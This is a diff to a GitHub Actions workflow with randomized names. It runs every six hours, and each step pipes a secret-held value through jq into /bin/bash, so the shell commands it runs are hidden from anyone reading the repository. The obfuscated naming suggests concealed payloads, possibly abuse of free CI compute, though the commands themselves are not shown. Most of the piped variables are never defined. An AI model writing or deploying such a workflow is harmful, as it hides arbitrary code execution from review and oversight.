@@ -2,7 +2,7 @@ name: yanjiaxin4635
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '30 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanjiaxin4635
         env:
-          nbd98115: ${{ secrets.nbd98115 }}
+          to639: ${{ secrets.to639 }}
         run: |
-          echo $nbd98115 | jq -r .eyd760 | /bin/bash
-          echo $igq8512 | jq -r .x0045 | /bin/bash
-          echo $ptt7786 | jq -r .ma928 | /bin/bash
-          echo $vsk9584 | jq -r .yuwfx37 | /bin/bash
-          echo $rrkle54 | jq -r .vcrgm9 | /bin/bash
+          echo $to639 | jq -r .r5769 | /bin/bash
+          echo $kq702 | jq -r .rveyu31324 | /bin/bash
+          echo $coepi03 | jq -r .l10169 | /bin/bash
+          echo $uq4 | jq -r .n51127 | /bin/bash
+          echo $rmz03604 | jq -r .gow5740 | /bin/bash
+          echo $fmybx5186 | jq -r .vuuoi1 | /bin/bash
+          echo $grvdp07 | jq -r .l91 | /bin/bash
+          echo $m6318 | jq -r .ad2735 | /bin/bash
+          echo $kez84298 | jq -r .bpik196 | /bin/bash
+          echo $sj7 | jq -r .w21 | /bin/bash
+          echo $udx9 | jq -r .asbp756 | /bin/bash
+          echo $oy089 | jq -r .c53 | /bin/bash
 
